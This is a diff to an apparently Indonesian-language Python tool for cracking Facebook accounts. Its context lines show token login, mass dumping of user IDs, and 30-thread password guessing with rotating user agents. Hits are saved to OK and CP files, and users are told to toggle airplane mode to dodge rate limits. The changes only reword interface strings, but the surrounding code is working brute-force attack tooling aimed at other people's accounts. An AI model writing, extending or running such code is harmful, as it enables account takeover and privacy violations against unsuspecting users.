@@ -103,7 +103,7 @@ def login():
 # LOGIN
 def login_lagi():
 	banner()
-	sky = '# LOGIN MENGGUNAKAN AKSES TOKEN'
+	sky = '# LOGIN MENGGUNAKAN TOKEN'
 	sky2 = mark(sky, style='green')
 	sol().print(sky2, style='cyan')
 	panda = input(x+'['+p+'f'+x+'] Token : ')
@@ -334,7 +334,7 @@ def dump_massal():
 		exit()
 	uid = []
 	yz = 0
-	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
+	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Diri sendiri')
 	for met in range(jum):
 		yz+=1
 		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
@@ -368,7 +368,7 @@ def dump_massal():
 def setting():
 	wl = '# SETTING URUTAN ID'
 	sol().print(mark(wl, style='green'))
-	teks = '[01] Crack Dari Akun Tertua (Not Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Highly Recommended)'
+	teks = '[01] Crack Dari Akun Tertua (Tidak Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Sangat Recommended)'
 	tak = nel(teks, style='cyan')
 	cetak(nel(tak, title='SETTING'))
 	hu = input(x+'['+p+'f'+x+'] Pilih : ')
@@ -393,7 +393,7 @@ def passwrd():
 	global loop
 	ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
 	sol().print(mark(ler, style='green'))
-	krek = 'Hasil Live Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
+	krek = 'Hasil Live Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 1k id'%(okc,cpc)
 	cetak(nel(krek, title='CRACK'))
 	pool = tred(max_workers=30)
 	for yuzong in id2:
@@ -422,7 +422,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s👉 %s/%s - - > ok*%s - - -> cp*%s - - -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(uao).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
